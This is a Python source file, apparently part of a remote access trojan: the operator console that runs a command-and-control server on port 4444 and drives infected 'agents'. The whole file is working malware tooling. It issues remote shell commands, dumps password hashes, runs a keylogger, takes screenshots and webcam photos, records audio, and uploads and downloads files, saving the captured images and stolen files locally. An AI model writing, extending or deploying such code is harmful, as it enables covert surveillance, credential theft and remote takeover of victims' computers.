import threading
import time
import os
import base64
from rat_server import RatServer

class ServerInterface:
    def __init__(self):
        self.server = None
        self.current_client = None
        self.running = False
        
    def start(self, host="0.0.0.0", port=4444):
        # demarre le serveur dans un thread separe
        self.server = RatServer(host, port)
        server_thread = threading.Thread(target=self.server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)  # laisse le temps au serveur de demarrer
        self.running = True
        self.main_loop()
        
    def main_loop(self):
        print("=== RAT Server Interface ===")
        print("Type 'help' for available commands")
        
        while self.running:
            try:
                if self.current_client:
                    prompt = f"rat agent {self.current_client} > "
                else:
                    prompt = "rat > "
                    
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                    
                if self.current_client:
                    self.handle_agent_command(cmd)
                else:
                    self.handle_main_command(cmd)
                    
            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                if self.server:
                    self.server.stop()
                break
            except EOFError:
                break
                
    def handle_main_command(self, cmd):
        # commandes du menu principal
        parts = cmd.split()
        command = parts[0].lower()
        
        if command == "help":
            self.show_main_help()
        elif command == "sessions":
            self.list_sessions()
        elif command == "interact":
            if len(parts) > 1:
                try:
                    client_id = int(parts[1].replace("agent", ""))
                    self.interact_with_client(client_id)
                except ValueError:
                    print("[-] Invalid agent ID")
            else:
                print("[-] Usage: interact agent<id>")
        elif command == "exit" or command == "quit":
            self.running = False
        else:
            print(f"[-] Unknown command: {command}")
            
    def handle_agent_command(self, cmd):
        # commandes pour un agent specifique
        parts = cmd.split()
        command = parts[0].lower()
        
        if command == "back":
            self.current_client = None
            return
        elif command == "help":
            self.show_agent_help()
            return
            
        # envoie la commande au client
        response = self.server.send_command(self.current_client, command, {"args": parts[1:] if len(parts) > 1 else []})
        
        if response["status"] == "ok":
            self.display_response(command, response["data"])
        else:
            print(f"[-] Error: {response.get('message', 'Unknown error')}")
            
    def interact_with_client(self, client_id):
        clients = self.server.list_clients()
        if client_id in clients:
            self.current_client = client_id
            client_info = clients[client_id]["info"]
            print(f"[*] Interacting with agent {client_id}")
            print(f"    OS: {client_info.get('os', 'Unknown')}")
            print(f"    User: {client_info.get('user', 'Unknown')}")
            print(f"    IP: {clients[client_id]['addr'][0]}")
        else:
            print(f"[-] Agent {client_id} not found")
            
    def list_sessions(self):
        clients = self.server.list_clients()
        if not clients:
            print("[*] No active sessions")
            return
            
        print("[*] Active sessions:")
        for client_id, info in clients.items():
            last_seen = time.time() - info["last_seen"]
            print(f"  Agent {client_id} - {info['addr'][0]}:{info['addr'][1]} ({info['info'].get('os', 'Unknown')}) - Last seen: {int(last_seen)}s ago")
            
    def display_response(self, command, data):
        # affiche la reponse selon le type de commande
        if command == "screenshot":
            if "data" in data:
                # sauvegarde le screenshot
                filename = f"screenshot_{self.current_client}_{int(time.time())}.png"
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(data["data"]))
                print(f"[+] Screenshot saved as {filename}")
        elif command == "download":
            if "data" in data:
                filename = data.get("filename", f"downloaded_{int(time.time())}")
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(data["data"]))
                print(f"[+] File downloaded as {filename}")
        elif command == "webcam_snapshot":
            if "data" in data:
                filename = f"webcam_{self.current_client}_{int(time.time())}.jpg"
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(data["data"]))
                print(f"[+] Webcam snapshot saved as {filename}")
        else:
            # affichage generique
            if isinstance(data, dict) and "output" in data:
                print(data["output"])
            else:
                print(str(data))
                
    def show_main_help(self):
        print("""
Available commands:
  sessions         - List active sessions
  interact agent<id> - Interact with specific agent
  help            - Show this help
  exit/quit       - Exit the server
        """)
        
    def show_agent_help(self):
        print("""
Agent commands:
  help            - Show this help
  ipconfig        - Get network configuration
  screenshot      - Take a screenshot
  shell <cmd>     - Execute shell command
  download <file> - Download file from target
  upload <file>   - Upload file to target
  search <pattern> - Search for files
  hashdump        - Dump password hashes
  keylogger start/stop - Control keylogger
  webcam_snapshot - Take webcam photo
  webcam_stream   - Start webcam stream
  record_audio <duration> - Record audio
  back            - Return to main menu
        """)

if __name__ == "__main__":
    interface = ServerInterface()
    interface.start()